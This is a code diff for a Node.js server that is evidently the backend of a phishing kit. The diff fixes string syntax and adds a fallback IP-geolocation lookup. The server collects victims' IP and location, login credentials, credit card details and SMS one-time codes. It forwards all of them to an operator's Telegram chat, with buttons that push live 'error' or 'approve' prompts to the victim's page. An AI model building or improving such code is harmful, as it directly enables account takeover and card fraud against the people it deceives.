@@ -19,44 +19,62 @@ app.use(bodyParser.urlencoded({ extended: true }));
 
 const sseConnections = {};
 app.get('/details', async (req, res) => {
-    const visitorIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const visitorIp = (req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',')[0].trim();
     const userAgent = req.headers['user-agent'];
     const userId = req.headers['user-id'];
+
     if (!userId) {
         return res.status(400).json({ success: false, message: "User ID is required" });
     }
 
     const parsedUserAgent = userAgentParser(userAgent);
-    const browser = parsedUserAgent.browser.name;
+    const browser = parsedUserAgent.browser.name || 'Unknown';
 
-    let visitorCity = '';
-    let visitorCountry = '';
-    let visitorProvider = '';
+    let visitorCity = 'Unknown';
+    let visitorCountry = 'Unknown';
+    let visitorProvider = 'Unknown';
+    let visitorHostname = 'Unknown';
 
     try {
-        const ipInfoResponse = await axios.get(http://ip-api.com/json/${visitorIp});
+        console.log('Fetching IP info for:', visitorIp);
+        const ipInfoResponse = await axios.get(`http://ip-api.com/json/${visitorIp}`);
         const ipInfo = ipInfoResponse.data;
 
         if (ipInfo && ipInfo.status === 'success') {
             visitorCity = ipInfo.city || 'Unknown';
             visitorCountry = ipInfo.country || 'Unknown';
             visitorProvider = ipInfo.org || 'Unknown';
+            visitorHostname = ipInfo.hostname || 'Unknown';
+        } else {
+            console.error('Failed to retrieve IP information:', ipInfo);
         }
     } catch (error) {
-        console.error('Error fetching IP information:', error);
+        console.error('Error fetching IP information from ip-api:', error);
+        // Optional fallback
+        try {
+            const fallbackResponse = await axios.get(`https://ipinfo.io/${visitorIp}?token=<YOUR_IPINFO_TOKEN>`);
+            const fallbackInfo = fallbackResponse.data;
+            visitorCity = fallbackInfo.city || 'Unknown';
+            visitorCountry = fallbackInfo.country || 'Unknown';
+            visitorProvider = fallbackInfo.org || 'Unknown';
+            visitorHostname = fallbackInfo.hostname || 'Unknown';
+        } catch (fallbackError) {
+            console.error('Fallback API also failed:', fallbackError);
+        }
     }
 
-    const message = 
-🚨 New Visitor Alert 🚨
-=====================
-🌍 IP Address: ${visitorIp}
-🏙 City: ${visitorCity}
-🏳️ Country: ${visitorCountry}
-🌐 Browser: ${browser}
-🛣 Provider: ${visitorProvider}
-🆔 User ID: ${userId}  
-=====================
-;
+			const message = `
+		🚨 New Visitor Alert 🚨
+		=====================
+		🌍 IP Address: ${visitorIp}
+		🔗 Hostname: ${visitorHostname}
+		🏙 City: ${visitorCity}
+		🏳️ Country: ${visitorCountry}
+		🌐 Browser: ${browser}
+		🛣 Provider: ${visitorProvider}
+		🆔 User ID: ${userId}  
+		=====================
+		`;
 
     try {
         await sendToTelegram(message, userId);
@@ -82,7 +100,7 @@ app.get('/details-approve', async (req, res) => {
     let visitorProvider = '';
 
     try {
-        const ipInfoResponse = await axios.get(http://ip-api.com/json/${visitorIp});
+        const ipInfoResponse = await axios.get(`http://ip-api.com/json/${visitorIp}`);
         const ipInfo = ipInfoResponse.data;
 
         if (ipInfo && ipInfo.status === 'success') {
@@ -94,7 +112,7 @@ app.get('/details-approve', async (req, res) => {
         console.error('Error fetching IP information:', error);
     }
 
-    const message = 
+    const message = `
 🚨 User On Approve 🚨
 =====================
 🌍 IP Address: ${visitorIp}
@@ -104,7 +122,7 @@ app.get('/details-approve', async (req, res) => {
 🛣 Provider: ${visitorProvider}
 🆔 User ID: ${userId}  
 =====================
-;
+`;
 
     try {
         await sendToTelegram(message, userId);
@@ -116,7 +134,7 @@ app.get('/details-approve', async (req, res) => {
 });
 app.get('/user-id', (req, res) => {
     const userId = generateZariNumberId();
-    console.log(Generated user ID: ${userId});
+    console.log(`Generated user ID: ${userId}`);
     res.json({ success: true, userId });
 });
 
@@ -134,7 +152,7 @@ app.post('/login', async (req, res) => {
         return res.status(400).send('Please provide both username and password.');
     }
 
-    const message = 
+    const message = `
 🚨Login
 =====================
 🧑‍💻 Email: ${username}
@@ -142,7 +160,7 @@ app.post('/login', async (req, res) => {
 =====================
 🌍 User ID: ${userId}
 =====================
-;
+`;
 
     try {
         console.log('Sending login message to Telegram...');
@@ -171,7 +189,7 @@ app.post('/send-cc', async (req, res) => {
         zipcode
     } = req.body;
 
-    const message = 
+    const message = `
 🚨 CC Data
 =====================
 👤 Name: ${cc_holder}
@@ -183,7 +201,7 @@ app.post('/send-cc', async (req, res) => {
 =====================
 🌍 User ID: ${userId}
 =====================
-;
+`;
 
     try {
         console.log('Sending CC data to Telegram...');
@@ -203,14 +221,14 @@ app.post('/send-cc', async (req, res) => {
 app.post('/send-sms', async (req, res) => {
     const { codeSms, userId } = req.body;
 
-    const message = 
+    const message = `
 🚨 Sms Code
 =====================
 🔑 Code: ${codeSms}
 =====================
 🌍 User ID: ${userId}
 =====================
-;
+`;
 
     try {
         console.log('Sending SMS code to Telegram...');
@@ -228,25 +246,25 @@ app.post('/send-sms', async (req, res) => {
 
 async function sendToTelegram(message, userId) {
     try {
-        console.log(Sending message to Telegram for userId: ${userId});
+        console.log(`Sending message to Telegram for userId: ${userId}`);
         await bot.sendMessage(chatId, message, {
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: 'Login', callback_data: login|${userId} },
-                        { text: 'Update', callback_data: cc|${userId} },
+                        { text: 'Login', callback_data: `login|${userId}` },
+                        { text: 'Update', callback_data: `cc|${userId}` },
                     ],
                     [
-                        { text: 'Otp', callback_data: sms|${userId} },
-                        { text: 'Approve', callback_data: approve|${userId} },
+                        { text: 'Otp', callback_data: `sms|${userId}` },
+                        { text: 'Approve', callback_data: `approve|${userId}` },
                     ],
                     [
-                        { text: 'Update-Error', callback_data: updateError|${userId} },
-                        { text: 'Otp-Error', callback_data: otpError|${userId} },
-                        { text: 'Login-Error', callback_data: loginError|${userId} },
+                        { text: 'Update-Error', callback_data: `updateError|${userId}` },
+                        { text: 'Otp-Error', callback_data: `otpError|${userId}` },
+                        { text: 'Login-Error', callback_data: `loginError|${userId}` },
                     ],
                     [
-                        { text: 'Thankyou', callback_data: thankyou|${userId} },
+                        { text: 'Thankyou', callback_data: `thankyou|${userId}` },
                     ],
                 ],
             },
@@ -264,48 +282,48 @@ bot.on('callback_query', async (callbackQuery) => {
     let responseText = '';
     let showRedirect = false;
 
-    console.log(Callback received: action=${action}, userId=${userId});
+    console.log(`Callback received: action=${action}, userId=${userId}`);
 
     switch (action) {
         case 'login':
-            responseText = User ${userId} clicked Login.;
+            responseText = `User ${userId} clicked Login.`;
             break;
         case 'cc':
-            responseText = User ${userId} clicked CC.;
+            responseText = `User ${userId} clicked CC.`;
             break;
         case 'sms':
-            responseText = User ${userId} clicked SMS.;
+            responseText = `User ${userId} clicked SMS.`;
             break;
         case 'otpError':
-            responseText = User ${userId} clicked otpError.;
+            responseText = `User ${userId} clicked otpError.`;
             break;
         case 'updateError':
-            responseText = User ${userId} clicked updateError.;
+            responseText = `User ${userId} clicked updateError.`;
             break;
         case 'approve':
-            responseText = User ${userId} clicked approve.;
+            responseText = `User ${userId} clicked approve.`;
             break;
         case 'loginError':
-            responseText = User ${userId} clicked loginError.;
+            responseText = `User ${userId} clicked loginError.`;
             break;
         case 'thankyou':
-            responseText = User ${userId} clicked thankyou.;
+            responseText = `User ${userId} clicked thankyou.`;
             break;
         default:
-            responseText = Unknown action for user ${userId}.;
+            responseText = `Unknown action for user ${userId}.`;
             break;
     }
 
     try {
 
         await bot.answerCallbackQuery(id, { text: responseText });
-        console.log(Answered callback query with text: ${responseText});
+        console.log(`Answered callback query with text: ${responseText}`);
 
 
         if (sseConnections[userId]) {
-            console.log(Sending SSE update for user ${userId});
+            console.log(`Sending SSE update for user ${userId}`);
             sseConnections[userId].forEach((client) => {
-                client.write(data: ${JSON.stringify({ action, userId, showRedirect })}\n\n);
+                client.write(`data: ${JSON.stringify({ action, userId, showRedirect })}\n\n`);
             });
         }
     } catch (error) {
@@ -315,7 +333,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
 app.get('/sse/:userId', (req, res) => {
     const { userId } = req.params;
-    console.log(SSE connection started for userId: ${userId});
+    console.log(`SSE connection started for userId: ${userId}`);
 
     res.setHeader('Content-Type', 'text/event-stream');
     res.setHeader('Cache-Control', 'no-cache');
@@ -328,17 +346,17 @@ app.get('/sse/:userId', (req, res) => {
     sseConnections[userId].push(res);
 
     req.on('close', () => {
-        console.log(SSE connection closed for userId: ${userId});
+        console.log(`SSE connection closed for userId: ${userId}`);
         sseConnections[userId] = sseConnections[userId].filter(client => client !== res);
     });
 });
 
 app.post('/updateFrontend', (req, res) => {
     const { userId, action } = req.body;
-    console.log(User ${userId}: Action - ${action});
+    console.log(`User ${userId}: Action - ${action}`);
     res.send({ success: true });
 });
 
 app.listen(port, () => {
-    console.log(Server running at http://localhost:${port});
+    console.log(`Server running at http://localhost:${port}`);
 });
